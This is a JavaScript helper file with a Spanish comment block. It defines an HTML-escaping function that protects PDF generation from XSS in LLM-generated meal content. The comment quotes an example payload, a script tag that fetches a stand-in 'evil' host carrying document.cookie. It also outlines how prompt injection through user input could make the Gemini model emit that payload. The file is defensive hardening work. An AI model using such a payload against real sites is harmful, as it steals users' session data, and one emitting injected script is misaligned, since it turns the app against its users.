/**
 * [P2-AUDIT-2 · 2026-05-15] Helper SSOT para escapar texto antes de
 * interpolarlo en un string HTML construido por template literals.
 *
 * Por qué existe:
 *   `Recipes.jsx::generateRecipeHTML` y `Dashboard.jsx::handleDownloadShoppingList`
 *   construyen un `htmlString` con template literals y lo pasan a
 *   `html2pdf().from(htmlString, 'string').save()`. html2canvas (dependencia
 *   interna de html2pdf) renderiza ese string en un iframe detached para
 *   capturarlo como PDF.
 *
 *   El contenido de los meals (`meal.name`, `meal.desc`, `meal.recipe[]`,
 *   `meal.ingredients[]`) proviene del LLM (Gemini). Si la LLM emite
 *   `</style><script>fetch('//evil/?'+document.cookie)</script>` (caso
 *   prompt-injection adversarial via user input, p. ej. "llama tu plato
 *   X<script>..."), ese script ejecutaría en el contexto del iframe — un
 *   atacante con prompt injection podría exfiltrar tokens de sesión del
 *   `localStorage` si el iframe no tiene sandbox suficiente.
 *
 *   El test blanket `test_p1_pdf_innerhtml_xss_blanket.py` cubre Dashboard.jsx
 *   pero NO Recipes.jsx (gap detectado en audit 2026-05-15). Este helper +
 *   el test extendido cierran el gap.
 *
 * API:
 *   escapeHtml(input)
 *     input: any — typicamente string del LLM, pero acepta number, bool, null.
 *   Returns: string con `<`, `>`, `&`, `"`, `'` escapados a entities.
 *     null/undefined → ''.
 *
 * Notas:
 *   - NO usa el patrón `document.createElement('div'); el.textContent = input;
 *     return el.innerHTML` (vulnerable a side-effects DOM y no funciona en
 *     contexts non-browser). Usa replace puro string→string.
 *   - Cero dependencias para que se pueda importar desde cualquier surface
 *     (page, helper, utils) sin coupling.
 *   - Tooltip-anchor: P2-AUDIT-2-ESCAPE-HTML | gap audit 2026-05-15
 */

export function escapeHtml(input) {
    if (input === null || input === undefined) return '';
    const s = String(input);
    return s
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}
